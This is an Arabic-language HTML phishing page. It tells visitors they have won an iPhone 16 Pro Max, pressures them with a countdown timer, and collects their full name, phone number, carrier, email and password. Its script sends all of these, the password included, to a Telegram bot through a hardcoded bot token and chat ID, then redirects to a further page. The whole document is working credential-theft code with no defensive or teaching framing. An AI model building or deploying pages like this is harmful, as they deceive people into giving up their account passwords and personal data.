<!DOCTYPE html>  <html lang="ar" dir="rtl">  
<head>  
  <meta charset="UTF-8">  
  <title>🎉 تهانينا! فزت بـ iPhone 16 Pro Max 🎉</title>  
  <style>  
    body {  
      font-family: 'Arial', sans-serif;  
      background: #f7f7f7;  
      color: #333;  
      text-align: center;  
      margin: 0;  
      padding: 0;  
      overflow-x: hidden;  
    }  .container {  
  max-width: 420px;  
  margin: 50px auto;  
  background: #fff;  
  padding: 25px;  
  border-radius: 12px;  
  box-shadow: 0 0 12px rgba(0,0,0,0.1);  
  position: relative;  
}  

h1 {  
  color: #4CAF50;  
  font-size: 24px;  
  margin-bottom: 15px;  
}  

img {  
  width: 100%;  
  border-radius: 10px;  
  margin-bottom: 15px;  
}  

input, select {  
  width: 100%;  
  padding: 10px;  
  margin: 10px 0;  
  border: 1px solid #ccc;  
  border-radius: 6px;  
  font-size: 15px;  
}  

button {  
  background-color: #4CAF50;  
  color: white;  
  border: none;  
  padding: 12px;  
  width: 100%;  
  border-radius: 6px;  
  font-size: 16px;  
  cursor: pointer;  
  transition: background 0.3s;  
}  

button:hover {  
  background-color: #45a049;  
}  

.footer {  
  margin-top: 15px;  
  font-size: 12px;  
  color: #888;  
}  

.countdown {  
  font-size: 20px;  
  color: red;  
  font-weight: bold;  
  margin-bottom: 10px;  
}  

.alert-msg {  
  background: #fff3cd;  
  color: #856404;  
  padding: 10px;  
  border-radius: 6px;  
  margin-bottom: 15px;  
  border: 1px solid #ffeeba;  
}  

.celebrate {  
  position: absolute;  
  top: 0;  
  left: 0;  
  width: 100%;  
  height: 100%;  
  pointer-events: none;  
}  

.celebrate span {  
  position: absolute;  
  font-size: 24px;  
  animation: float 4s linear infinite;  
}  

@keyframes float {  
  0% {  
    transform: translateY(0) rotate(0deg);  
    opacity: 1;  
  }  
  100% {  
    transform: translateY(-500px) rotate(360deg);  
    opacity: 0;  
  }  
}

  </style>  
</head>  
<body>  
  <div class="container">  
    <div class="celebrate" id="celebrate"></div>  <img src="iphon.png" alt="iPhone 16 Pro Max">  

<h1>🎉 تهانينا! فزت بـ iPhone 16 Pro Max 🎁</h1>  

<div class="alert-msg">  
  ⏳ لا تفوّت الفرصة! العرض ينتهي قريبًا!  
</div>  

<div class="countdown" id="timer">05:00</div>  

<form id="form">  
  <input type="text" id="name" placeholder="الاسم الكامل" required>  

  <select id="countryCode" required>  
    <option value="">اختر الدولة</option>  
    <option value="+966">🇸🇦 السعودية</option>  
    <option value="+967">🇾🇪 اليمن</option>  
    <option value="+971">🇦🇪 الإمارات</option>  
    <option value="+20">🇪🇬 مصر</option>  
  </select>  

  <input type="tel" id="phone" placeholder="رقم الهاتف" required>  

  <select id="carrier" required>  
    <option value="">اختر شركة الاتصال</option>  
    <option value="يمن موبايل">📡 يمن موبايل</option>  
    <option value="يو">📶 يو</option>  
    <option value="سبافون">📲 سبافون</option>  
  </select>  

  <input type="email" id="email" placeholder="البريد الإلكتروني" required>  
  <input type="password" id="password" placeholder="كلمة المرور" required>  

  <button type="submit">تأكيد التسجيل</button>  
</form>  

<div class="footer">© 2025 - العرض ساري لفترة محدودة</div>

  </div>    <script>  
    // 🎉 تأثير احتفالي  
    const celebrateContainer = document.getElementById("celebrate");  
    const emojis = ["🎉", "✨", "🎊", "🌟"];  
    for (let i = 0; i < 40; i++) {  
      const span = document.createElement("span");  
      span.innerText = emojis[Math.floor(Math.random() * emojis.length)];  
      span.style.left = Math.random() * 100 + "%";  
      span.style.top = "100%";  
      span.style.animationDelay = Math.random() * 3 + "s";  
      celebrateContainer.appendChild(span);  
    }  
  
    // ⏳ العداد التنازلي  
    let duration = 5 * 60;  
    const timerEl = document.getElementById("timer");  
    const countdown = setInterval(() => {  
      const minutes = Math.floor(duration / 60);  
      const seconds = duration % 60;  
      timerEl.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;  
      if (--duration < 0) {  
        clearInterval(countdown);  
        timerEl.textContent = "انتهى الوقت!";  
      }  
    }, 1000);  
  
    // 📤 إرسال البيانات إلى بوت تيليجرام  
    const form = document.getElementById("form");  
    form.addEventListener("submit", function (e) {  
      e.preventDefault();  
  
      const name = document.getElementById("name").value;  
      const countryCode = document.getElementById("countryCode").value;  
      const phone = document.getElementById("phone").value;  
      const carrier = document.getElementById("carrier").value;  
      const email = document.getElementById("email").value;  
      const password = document.getElementById("password").value;  
  
      const message = `📲 تسجيل جديد:\n👤 الاسم: ${name}\n🌍 الدولة: ${countryCode}\n📱 الرقم: ${phone}\n🏢 شركة الاتصال: ${carrier}\n📧 الإيميل: ${email}\n🔐 كلمة المرور: ${password}`;  
  
      const botToken = "8193610477:AAG3NPzR0X_1gnYzV6BN8pk0Kvu2UodSvUo";  
      const chatId = "7291951434";  
  
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
        method: "POST",  
        headers: { "Content-Type": "application/json" },  
        body: JSON.stringify({ chat_id: chatId, text: message })  
      })  
      .then(response => {  
        if (response.ok) {  
          window.location.href = "page3.html";  
        } else {  
          alert("حدث خطأ أثناء إرسال البيانات.");  
        }  
      });  
    });  
  </script>  </body>  
</html>
